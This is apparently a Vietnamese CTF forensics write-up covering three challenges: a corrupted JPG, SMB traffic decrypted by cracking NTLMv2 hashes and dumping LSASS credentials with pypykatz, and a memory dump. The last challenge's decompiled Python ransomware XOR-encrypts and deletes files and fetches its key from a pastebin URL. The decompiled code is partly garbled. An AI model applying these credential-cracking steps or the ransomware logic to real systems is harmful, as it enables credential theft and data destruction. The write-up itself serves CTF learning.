![image](https://hackmd.io/_uploads/rJSEudRH1g.png)
## Unwanted Meow 
![image](https://hackmd.io/_uploads/r11wuOArJe.png)
### Solution
##### Sau khi tải challege về ta được 1 file jpg, tuy nhiên file đã bị hỏng mở không lên. Sử dụng hexed.it để xem hex code của nó.
![image](https://hackmd.io/_uploads/BkYyYdRH1l.png)
##### Có 1 vài byte meow bị chèn vô trong ảnh này, dùng cyberchef để loại bỏ nó ra
![image](https://hackmd.io/_uploads/B1sBKOCrye.png)
## Oh Man 
![image](https://hackmd.io/_uploads/ByNdYuCrke.png)
### Solution
##### Mở file pcapng được cung cấp ta thấy hàng loạt gói smb2 đã bị mã hóa, khả năng hacker đã đánh cắp dữ liệu thông qua giao thức này
##### Tuy nhiên để giải mã được lượng dữ liệu bị mã hóa này ta phải xác định được NThash của nó (hoặc mật khẩu người dùng), để làm được điều đó, ta cần trích xuất các thông tin cần thiết rồi crack mật khẩu bằng john hoặc hashcat như hướng dẫn ở [blog này](https://www.mike-gualtieri.com/posts/live-off-the-land-and-crack-the-ntlmssp-protocol)
![image](https://hackmd.io/_uploads/BklJj_AHkx.png)
##### Thay vì trích xuất thủ công ta sử dụng công cụ [NTLMRawUnHide](https://github.com/mlgualtieri/NTLMRawUnHide) 
```
┌──(kali㉿kali)-[~/Downloads/NTLMRawUnHide]
└─$ python3 NTLMRawUnHide.py -i ~/Downloads/wargames\ /wgmy-ohman.pcapng 
                                                              /%(
                               -= Find NTLMv2 =-          ,@@@@@@@@&
           /%&@@@@&,            -= hashes w/ =-          %@@@@@@@@@@@*
         (@@@@@@@@@@@(       -= NTLMRawUnHide.py =-    *@@@@@@@@@@@@@@@.
        &@@@@@@@@@@@@@@&.                             @@@@@@@@@@@@@@@@@@(
      ,@@@@@@@@@@@@@@@@@@@/                        .%@@@@@@@@@@@@@@@@@@@@@
     /@@@@@@@#&@&*.,/@@@@(.                            ,%@@@@&##(%@@@@@@@@@.
    (@@@@@@@(##(.         .#&@%%(                .&&@@&(            ,/@@@@@@#
   %@@@@@@&*/((.         #(                           ,(@&            ,%@@@@@@*
  @@@@@@@&,/(*                                           ,             .,&@@@@@#                                                                                      
 @@@@@@@/*//,                                                            .,,,**                                                                                       
   .,,  ...                                                                                                                                                           
                                    .#@@@@@@@(.                                                                                                                       
                                   /@@@@@@@@@@@&                                                                                                                      
                                   .@@@@@@@@@@@*                                                                                                                      
                                     .(&@@@%/.  ..                                                                                                                    
                               (@@&     %@@.   .@@@,                                                                                                                  
                          /@@#          @@@,         %@&                                                                                                              
                               &@@&.    @@@/    @@@#                                                                                                                  
                          .    %@@@(   ,@@@#    @@@(     ,                                                                                                            
                         *@@/         .@@@@@(          #@%                                                                                                            
                          *@@%.      &@@@@@@@@,      /@@@.                                                                                                            
                           .@@@@@@@@@@@&. .*@@@@@@@@@@@/.                                                                                                             
                              .%@@@@%,        /%@@@&(.                                                                                                                
                                                                                                                                                                      
                                                                                                                                                                      
Searching /home/kali/Downloads/wargames /wgmy-ohman.pcapng for NTLMv2 hashes...                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : 21bf7dbd40d05620                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 :                                                                                                                                        
    > Username               :                                                                                                                                        
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
NTLM NULL session found... no hash to generate                                                                                                                        
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : 7aaff6ea26301fc3                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 : DESKTOP-PMNU0JK                                                                                                                        
    > Username               : Administrator                                                                                                                          
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
Administrator::DESKTOP-PMNU0JK:7aaff6ea26301fc3:ae62a57caaa5dd94b68def8fb1c192f3:01010000000000008675779b2e57db01376f686e57504d770000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b00070008008675779b2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000                                                                                                                               
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : a1adc9d0bfe2c7c1                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 : DESKTOP-PMNU0JK                                                                                                                        
    > Username               : Administrator                                                                                                                          
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
Administrator::DESKTOP-PMNU0JK:a1adc9d0bfe2c7c1:d43050f791ffabb9000c94bc5261ec52:0101000000000000fffb809b2e57db015569395a4c546b720000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0007000800fffb809b2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000                                                                                                                               
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : e9cc7c3171bb95b9                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 : DESKTOP-PMNU0JK                                                                                                                        
    > Username               : Administrator                                                                                                                          
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
Administrator::DESKTOP-PMNU0JK:e9cc7c3171bb95b9:4dd18b7e39dfe0538da53182e84a2f7c:010100000000000035878a9b2e57db0179363032797135620000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b000700080035878a9b2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000                                                                                                                               
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : ce1e228fd442539e                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 : DESKTOP-PMNU0JK                                                                                                                        
    > Username               : Administrator                                                                                                                          
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
Administrator::DESKTOP-PMNU0JK:ce1e228fd442539e:f1de649eca87cd4430df45334ede036b:0101000000000000c312949b2e57db01514b36414d6e6b6f0000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0007000800c312949b2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000                                                                                                                               
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : 87c2136c9e0cfc7c                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 : DESKTOP-PMNU0JK                                                                                                                        
    > Username               : Administrator                                                                                                                          
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
Administrator::DESKTOP-PMNU0JK:87c2136c9e0cfc7c:6035de8eeaaccc30c4d0cf61c2ff1857:0101000000000000e3479b9b2e57db015630475a6e64616a0000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0007000800e3479b9b2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000                                                                                                                               
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : ad2f8a3f8191cfd6                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 : DESKTOP-PMNU0JK                                                                                                                        
    > Username               : Administrator                                                                                                                          
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
Administrator::DESKTOP-PMNU0JK:ad2f8a3f8191cfd6:d3b84a34cd713b950bae5dd8a9fb1523:0101000000000000e68df29c2e57db01436a6e6a5a5763420000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0007000800e68df29c2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000                                                                                                                               
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : e3badcd0e2b0bde3                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 : DESKTOP-PMNU0JK                                                                                                                        
    > Username               : Administrator                                                                                                                          
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
Administrator::DESKTOP-PMNU0JK:e3badcd0e2b0bde3:e840e74381ba416e3388006dce09a68d:0101000000000000cb78fe9c2e57db0134436f45673271510000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0007000800cb78fe9c2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000                                                                                                                               
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : fec80d9eb9c0249b                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 : DESKTOP-PMNU0JK                                                                                                                        
    > Username               : Administrator                                                                                                                          
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
Administrator::DESKTOP-PMNU0JK:fec80d9eb9c0249b:7e3b131e980a621eddb57dd19c7565ba:0101000000000000c303089d2e57db0163597878514a54790000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0007000800c303089d2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000                                                                                                                               
                                                                                                                                                                      
Found NTLMSSP Message Type 1 : Negotiation                                                                                                                            
                                                                                                                                                                      
Found NTLMSSP Message Type 2 : Challenge                                                                                                                              
    > Server Challenge       : fd50cb1c5db59df1                                                                                                                       
                                                                                                                                                                      
Found NTLMSSP Message Type 3 : Authentication                                                                                                                         
    > Domain                 : DESKTOP-PMNU0JK                                                                                                                        
    > Username               : Administrator                                                                                                                          
    > Workstation            :                                                                                                                                        
                                                                                                                                                                      
NTLMv2 Hash recovered:                                                                                                                                                
Administrator::DESKTOP-PMNU0JK:fd50cb1c5db59df1:e0e5937fef061d32f900e88d4d646b31:0101000000000000bf390f9d2e57db0159584666475750510000000002001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0001001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0004001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0003001e004400450053004b0054004f0050002d0050004d004e00550030004a004b0007000800bf390f9d2e57db010900280063006900660073002f004400450053004b0054004f0050002d0050004d004e00550030004a004b000000000000000000                                    
```
##### Bây giờ ta copy hết tất cả vô 1 tệp rồi crack mật khẩu
```
python3 NTLMRawUnHide.py -i ~/Downloads/wargames\ /wgmy-ohman.pcapng | grep -i Administrator:: > hash
```
![image](https://hackmd.io/_uploads/S1D9iuCHJx.png)
![image](https://hackmd.io/_uploads/H1QRjORHJl.png)
##### Ta tiếp tục lấy các giá trị NTPROOF, SESSKEY, USERNAME, ... từ wireshark thông qua payload 
> tshark -n -r wgmy-ohman.pcapng -Y 'ntlmssp.messagetype == 0x00000003' -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid
![image](https://hackmd.io/_uploads/SkSWpu0rye.png)
##### Sử dụng script python để trích xuất key ra 
```python
import hmac
from Crypto.Cipher import ARC4
from Crypto.Hash import MD5

# SESSION 0x0000a00000000015
USERNAME = 'Administrator'
WORKGROUP = 'DESKTOP-PMNU0JK'
NTHASH = bytes.fromhex('2084F334B78D2A9536683E705D6C1EE6')
NTPROOF = bytes.fromhex('ae62a57caaa5dd94b68def8fb1c192f3')
SESSKEY = bytes.fromhex('12140eb776cb74a339c9c75b152c52fd')

ud = (USERNAME + WORKGROUP).upper().encode('UTF-16LE')
rknt = hmac.new(NTHASH, ud, MD5).digest()
kek = hmac.new(rknt, NTPROOF, MD5).digest()
rsk = ARC4.new(kek).decrypt(SESSKEY)
print("Decrypted SMB Session Key is:", rsk.hex())


# Decrypted SMB Session Key is: 4147454a48564a4373437649574e504c
```
##### Vì session id bị ngược (0x00000c0000000065) ta chuyển lại cho đúng hoặc có thể sử dụng công cụ [này](https://www.save-editor.com/tools/wse_hex.html#littleendian)
![image](https://hackmd.io/_uploads/Skp8AuAHyl.png)
##### Bây giờ thêm key và session id vào wireshark thôi
![image](https://hackmd.io/_uploads/BywnCd0r1x.png)
##### Sau khi decrypt ta thấy có 5 file
![image](https://hackmd.io/_uploads/BkUy1t0Sye.png)
##### Sau khi lưu về, tại file `RxHmEj` ta thấy attacker sử dụng restore_signature và pypyktz để lấy mật khẩu lsass từ file `20241225_1939.log`
##### Ta có thể tìm thấy công cụ restore_signature thông qua repo [RToolZ](https://github.com/OmriBaso/RToolZ) trên github
![image](https://hackmd.io/_uploads/B1RzgtAByx.png)
> pypykatz lsa minidump 20241225_1939.log
![image](https://hackmd.io/_uploads/BkW8xtRBkx.png)
> Flag : wgmy{fbba48bee397414246f864fe4d2925e4}

## Tricky Malware 
![image](https://hackmd.io/_uploads/S1jteFCrkl.png)
### Solution
##### Challenge cho ta 2 file: 1 file memory dump và 1 file network. 
##### Phân tích file memory dump trước, dùng plugin pslist để xem các tiến trình đang chạy đồng thời quét xem ở các thư mục người dùng có hiện vật gì đáng nghi không
> python3 vol.py -f ~/Downloads/wargames\ /Evidence/memdump.mem windows.pslist

>  python3 vol.py -f ~/Downloads/wargames\ /Evidence/memdump.mem windows.filescan | grep -Ei "Downloads|Document|Desktop" 
![image](https://hackmd.io/_uploads/Hya9bF0B1g.png)
![image](https://hackmd.io/_uploads/BJHCWFCByg.png)
##### Có các process crypt.exe đồng thời tại Desktop cũng tồn tại 1 file tương tự
##### Bây giờ dump nó ra 
```
┌──(kali㉿kali)-[~/Personal/volatility3]
└─$ python3 vol.py -f ~/Downloads/wargames\ /Evidence/memdump.mem windows.dumpfiles --virtaddr 0xbc0ca7eb88c0                   
Volatility 3 Framework 2.14.0
Progress:  100.00               PDB scanning finished                        
Cache   FileObject      FileName        Result

DataSectionObject       0xbc0ca7eb88c0  crypt.exe       Error dumping file
ImageSectionObject      0xbc0ca7eb88c0  crypt.exe       file.0xbc0ca7eb88c0.0xbc0ca6ce1010.ImageSectionObject.crypt.exe.img
```
##### Dùng detect it easy để xác định loại file 
![image](https://hackmd.io/_uploads/rJakHKRS1x.png)
##### Ta thấy nó được viết bằng python nên dùng https://pyinstxtractor-web.netlify.app/ và https://pylingual.io
```
import os
import requests

def fetch_key_from_pastebin(url):
    """Fetch the encryption key from a Pastebin URL."""  # inserted
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.strip()
    except requests.exceptions.RequestException as e:
        print(f'Error fetching key: {e}0')
    else:  # inserted
        pass

def xor_encrypt_decrypt(data, key):
    """Encrypt or decrypt data using XOR with the given key."""  # inserted
    key_bytes = key.encode('utf-8')
    key_length = len(key_bytes)
    return bytes([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])

def process_file(file_path, key, encrypt=True):
    """Encrypt or decrypt a file and modify its extension."""  # inserted
    try:
        with open(file_path, 'rb') as file:
            pass  # postinserted
    except Exception as e:
            data = file.read()
                processed_data = xor_encrypt_decrypt(data, key)
                if encrypt:
                    new_file_path = file_path + '.oiiaiouiiiai'
                else:  # inserted
                    new_file_path = file_path.rsplit('.oiiaiouiiiai', 1)[0]
                with open(new_file_path, 'wb') as file:
                    file.write(processed_data)
                        os.remove(file_path)
                        print(f'Processed {file_path} -> {new_file_path}')
            print(f'Failed to process {file_path}: {e}')
if __name__ == '__main__':
    pastebin_url = 'https://pastebin.com/raw/PDXfh5bb'
    key = fetch_key_from_pastebin(pastebin_url)
    if not key:
        print('Failed to retrieve the key.')
        exit(1)
    for file_name in os.listdir():
        if not os.path.isfile(file_name):
            continue
        if file_name == os.path.basename(__file__):
            continue
        if file_name.endswith('.oiiaiouiiiai'):
            process_file(file_name, key, encrypt=False)
        else:  # inserted
            process_file(file_name, key, encrypt=True)
```
##### 1 đường dẫn pastebin ở đây, truy cập vào đó. Ta có flag

> WGMY{8b9777c8d7da5b10b65165489302af32}
